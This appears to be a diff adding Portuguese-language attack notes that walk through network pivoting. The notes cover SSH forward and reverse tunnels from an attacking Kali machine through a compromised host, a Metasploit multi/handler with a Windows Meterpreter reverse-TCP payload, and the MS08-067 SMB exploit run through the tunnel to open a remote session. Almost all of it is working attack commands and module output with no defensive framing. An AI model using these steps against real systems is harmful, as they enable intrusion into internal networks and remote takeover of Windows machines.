@@ -1,0 +1,45 @@
+1- INVADIR O ALVO, TENDO ACESSO AO SSH DA MAQUINA
+
+
+2) CRIAR O TUNEL DE IDA NO MEU KALI ATACANTE
+
+   kali# ssh -L 127.0.0.1:445:192.168.11.4:445 root@192.168.10.106
+                              alvo      porta alvo        pivot
+
+3) EM OUTRO TERMINAL DA MAQUINA INVADIDA CRIAR O TUNEL DE VOLTA PARA MINHA MAQUINA KALI
+
+                alvo# ssh root@127.0.0.1 -L 192.168.11.1:4444:192.168.200.5:4445
+                                        interface rede alvo       ip kali atacante  
+              
+ 
+5 - startar o handler
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost 0.0.0.0
+    set lport 4445
+    run -j
+
+6 - exploitar o alvo com o mesmo payload do handler
+
+    msf exploit(handler) > use exploit/windows/smb/ms08_067_netapi
+    msf exploit(ms08_067_netapi) > show options 
+    
+    Module options (exploit/windows/smb/ms08_067_netapi):
+    
+       Name     Current Setting  Required  Description
+       ----     ---------------  --------  -----------
+       RHOST    127.0.0.1     yes       The target address
+       RPORT    445              yes       The SMB service port
+       SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+    
+    
+    Payload options (windows/meterpreter/reverse_tcp):
+    
+       Name      Current Setting  Required  Description
+       ----      ---------------  --------  -----------
+       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+       LHOST     192.168.11.1     yes       The listen address
+       LPORT     4444             yes       The listen port
+
+       exploit
+       sessions -i 1
